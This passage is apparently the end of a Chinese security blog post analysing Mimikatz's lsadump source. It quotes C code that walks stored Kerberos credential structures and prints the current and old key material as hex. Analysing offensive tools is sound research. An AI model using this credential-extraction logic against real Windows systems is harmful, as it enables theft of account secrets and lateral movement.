        pKeyData = (PKERB_KEY_DATA) ((PBYTE) pKerb + sizeof(KERB_STORED_CREDENTIAL));
        pKeyData = kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, L"Credentials");
        kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, L"OldCredentials");
    }
    // kuhl_m_lsadump_lsa_keyDataInfo
    PKERB_KEY_DATA kuhl_m_lsadump_lsa_keyDataInfo(PVOID base, PKERB_KEY_DATA keys, USHORT Count, PCWSTR title)
    {
        USHORT i;
        if(Count)
        {
            if(title)
                kprintf(L"    %s\n", title);
            for(i = 0; i < Count; i++)
            {
                kprintf(L"      %s : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType));
                kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
                kprintf(L"\n");
            }
        }
        return (PKERB_KEY_DATA) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA));
    }
    

其他属性的解析与此类似，相关的结构体可以在`mimikatz\modules\kuhl_m_lsadump.h`中找到，此处不再赘述。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **落花流水鸭** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/262857](/post/id/262857)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Mimikatz](/tag/Mimikatz)
  * [注册表](/tag/注册表)

 **+1** __4赞

 __收藏

![](https://p3.ssl.qhimg.com/t0175eac96d8a826ad7.png) 落花流水鸭

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

